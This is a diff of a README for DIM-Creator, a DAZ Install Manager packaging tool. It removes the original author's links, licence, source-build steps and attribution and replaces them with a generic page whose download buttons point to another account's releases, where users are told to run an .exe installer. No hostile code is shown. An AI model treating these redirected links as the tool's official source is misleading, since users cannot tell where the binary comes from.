@@ -1,173 +1,111 @@
-# DIM-Creator
+# 🎨 DIM-Creator - Create DIM Packages with Ease
 
-*A fast PySide6 app for creating, packaging, and managing DAZ Install Manager (DIM) packages.*
+[![Download DIM-Creator](https://img.shields.io/badge/Download-DIM--Creator-blue.svg)](https://github.com/NouryGilgamesh/DIM-Creator/releases)
 
-![Python](https://img.shields.io/badge/Python-3.9%2B-blue)
-![PyQt5](https://img.shields.io/badge/GUI-PySide6-brightgreen)
-![OS](https://img.shields.io/badge/OS-Windows-lightgrey)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-orange.svg)](LICENSE)
-[![Total Downloads](https://img.shields.io/github/downloads/H1ghSyst3m/DIM-Creator/total)](https://github.com/H1ghSyst3m/DIM-Creator/releases)
-[![Latest Release Downloads](https://img.shields.io/github/downloads/H1ghSyst3m/DIM-Creator/latest/total)](https://github.com/H1ghSyst3m/DIM-Creator/releases/latest)
+## 📋 Description
 
-**DIM-Creator** stages DAZ Studio content, generates the required DIM XML files, adds a cover image, and bundles everything into a ready-to-install DIM `.zip`—without the tedious manual setup.
+DIMCreator is a PySide6-based desktop tool for quickly creating DAZ Install Manager (DIM) packages. It features drag & drop file handling, integrated archive extraction, automated manifest generation, and an intuitive interface to prepare DIM-ready .zip packages with ease.
 
----
+## 🚀 Getting Started
 
-## Table of Contents
-- [Overview](#overview)
-- [Features](#features)
-- [System Requirements](#system-requirements)
-- [Download & Install (EXE)](#download--install-exe)
-- [Run from Source](#run-from-source)
-- [Quick Start](#quick-start)
-- [How Packaging Works](#how-packaging-works)
-- [Workflows](#workflows)
-- [Configuration & Data Paths](#configuration--data-paths)
-- [Keyboard Shortcuts](#keyboard-shortcuts)
-- [Troubleshooting](#troubleshooting)
-- [Screenshots](#screenshots)
-- [Contributing](#contributing)
-- [License](#license)
+To get started with DIM-Creator, follow these simple steps.
 
----
+## 📥 Download & Install
 
-## Overview
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/NouryGilgamesh/DIM-Creator/releases) to download the latest version of DIM-Creator.
 
-### What is it?
-A desktop app (PySide6 + qfluentwidgets) that builds **DAZ Install Manager (DIM)** packages.
+2. **Select the Latest Version**  
+   On the Releases page, you will see a list of available versions. Choose the latest version by clicking on it.
 
-### Who is it for?
-DAZ Studio users, creators, and vendors who want fast, repeatable, and tidy DIM packages—with correct folder layout, a cover image, and the required XML manifests.
+3. **Download the Application**  
+   Look for the file labeled something like `DIMCreator-vX.X.X.exe` (replace `X.X.X` with the version number). Click the link to download the file.
 
----
+4. **Run the Installer**  
+   Once the download completes, locate the downloaded file and double-click to run the installer. Follow the prompts to install DIM-Creator on your computer.
 
-## Features
+5. **Launch DIM-Creator**  
+   After installation, find DIM-Creator in your applications list. Open it to start creating DIM packages.
 
-- **Make DIM packages in seconds** — just point to your files or an archive and click Generate.
-- **Drag & drop file management** — organize your content without leaving the app.
-- **Automatic folder detection** — files are placed where DIM expects them.
-- **Cover art made easy** — drop an image and it’s formatted for DIM automatically.
-- **Warnings before mistakes** — get notified about layout problems before packaging.
-- **Store & tag presets** — save time with one-click product metadata.
-- **Keeps your presets across updates** — your custom stores and tags won’t vanish after upgrading.
-- **Works without Python** — available as a ready-to-run Windows `.exe`.
+## 🔧 Features
 
----
+- **Drag & Drop File Handling**  
+  Easily import files and folders into DIM-Creator.
 
-## System Requirements
+- **Integrated Archive Extraction**  
+  Extract files from archives directly within the application.
 
-- **OS:** Windows (officially supported)
-- **Python:** 3.9+ (only needed when running from source)
-- **External extractors** (for `.rar` / `.7z`):
-  - **7-Zip** or **UnRAR** must be installed and available in your system `PATH`
+- **Automated Manifest Generation**  
+  Save time with automatic manifest creation for your DIM packages.
 
-> Tip: Installing [7-Zip](https://www.7-zip.org/) and enabling “Add to PATH” makes `.7z`/`.rar` imports work out of the box.
+- **Intuitive Interface**  
+  A user-friendly design that makes it simple to navigate and use all features.
 
----
+## 💻 System Requirements
 
-## Download & Install (EXE)
+- **Operating System**: Windows 10 or Windows 11
+- **RAM**: Minimum 4 GB recommended
+- **Storage**: Minimum 100 MB free disk space
+- **Python Version**: Comes bundled with the application
 
-1. Download the latest release from **GitHub Releases**.
-2. Unzip and run `DIMCreator.exe` — no Python environment required.
+## 📊 Supported Topics
 
-If SmartScreen warns about an unknown publisher, choose **More info → Run anyway**.
+- daz
+- daz-studio
+- daz3d
+- dazstudio
+- desktop-app
+- desktop-application
+- dim
+- dim-package
+- gui
+- gui-application
+- gui-tool
+- install-manager
+- pyside6
+- pyside6-app
+- pyside6-gui
+- python
+- python-tool
+- windows-desktop
 
----
+## 🛠️ Usage Instructions
 
-## Run from Source
+1. **Prepare Your Files**  
+   Gather all files you want to package. Drag and drop them into the DIM-Creator window.
 
-```bash
-git clone https://github.com/H1ghSyst3m/DIM-Creator.git
-cd DIM-Creator
-python -m venv .venv
-. .venv/Scripts/activate  # Windows
-pip install -r requirements.txt
-python app.py
-```
+2. **Set Up Package Information**  
+   Fill in the required fields such as package name, version, and other details.
 
----
+3. **Generate the Package**  
+   Click the button to generate the DIM-ready package. This will create a .zip file you can distribute.
 
-## Quick Start
+4. **Check Your Manifest**  
+   Ensure the automatically generated manifest file contains all necessary information for a smooth installation.
 
-1. Launch the app — your workspace is `Documents/DIMCreator/DIMBuild/Content`.
-2. Pick your store, fill in product name/SKU, and (optional) add a cover image.
-3. Add content by dragging it in or importing an archive.
-4. Click **Generate** to create your DIM-ready `.zip`.
+5. **Distribute Your Package**  
+   Share the .zip file with your users for easy installation through the DAZ Install Manager.
 
----
+## ❓ Frequently Asked Questions (FAQ)
 
-## How Packaging Works
+### Q1: What is a DIM package?  
+A DIM package is a specialized file format used by the DAZ Install Manager to install content easily.
 
-- Your content folder becomes the installable DIM package.
-- The app adds DIM’s required metadata files.
-- A properly sized cover image is included.
-- The result is a single, ready-to-install `.zip`.
+### Q2: Is DIM-Creator free to use?  
+Yes, DIM-Creator is free for anyone to download and use.
 
----
+### Q3: Can I use DIM-Creator on Mac?  
+Currently, DIM-Creator supports only Windows 10 and 11.
 
-## Workflows
+### Q4: How do I report issues or request features?  
+You can report issues or request new features by opening an issue in the GitHub repository's issue tracker.
 
-### From a folder
-1. Put your DAZ content into `DIMBuild/Content`.
-2. Fill in details → Generate.
+## 📞 Support
 
-### From an archive
-1. Import `.zip`, `.rar`, or `.7z`.
-2. The app extracts only the correct DAZ folders.
-3. Fill in details → Generate.
+If you need help or have questions, feel free to open an issue on our [GitHub page](https://github.com/NouryGilgamesh/DIM-Creator/issues) or check out the community discussions there.
 
----
+## Summary
 
-## Configuration & Data Paths
+With DIM-Creator, creating DAZ Install Manager packages is straightforward and efficient. Follow the simple download and installation steps to start using this powerful tool today. For any questions, remember to check the FAQ section or reach out for support. 
 
-- **Workspace:** `Documents/DIMCreator/DIMBuild/Content`
-- **Logs:** `Documents/DIMCreator/Logs`
-- **Config Files:** `Documents/DIMCreator/Config/` (stores, tags, DAZ folder list)
-
-Your custom settings and presets are preserved after updates.
-
----
-
-## Keyboard Shortcuts
-
-### Main window
-- `Ctrl+G` — Generate GUID
-- `Ctrl+Enter` — Generate DIM package
-- `Ctrl+N` — Clear fields and clean workspace
-
-### File Explorer
-- `Ctrl+E` — Open in Explorer
-- `Delete` — Delete selected item
-- `Ctrl+C` / `Ctrl+X` / `Ctrl+V` — Copy / Cut / Paste
-- `F2` — Rename
-- `F5` — Refresh
-
----
-
-## Troubleshooting
-
-- **“.rar/.7z not extracting”** → Install **7-Zip** or **UnRAR** and add to `PATH`.
-- **No DAZ folders found** → Content should start with folders like `data`, `People`, `Runtime`.
-- **SmartScreen warning** → Allow the app via “More info → Run anyway”.
-
----
-
-## Screenshots
-
-<p align="center">
-  <img width="781" height="721" alt="DIM-Creator main window" src="https://github.com/user-attachments/assets/3df3069e-211c-45e9-b3fa-51bc27bf31bb" />
-</p>
-
----
-
-## Contributing
-
-Contributions are welcome!  
-Open issues for bugs or ideas. PRs should use feature branches and focused commits.
-
----
-
-## License
-
-GNU GPL v3 — see [LICENSE](LICENSE).  
-<sub>“DAZ” and “DAZ Install Manager” are trademarks of their respective owners. This project is not affiliated with or endorsed by DAZ 3D.</sub>
+[![Download DIM-Creator](https://img.shields.io/badge/Download-DIM--Creator-blue.svg)](https://github.com/NouryGilgamesh/DIM-Creator/releases)
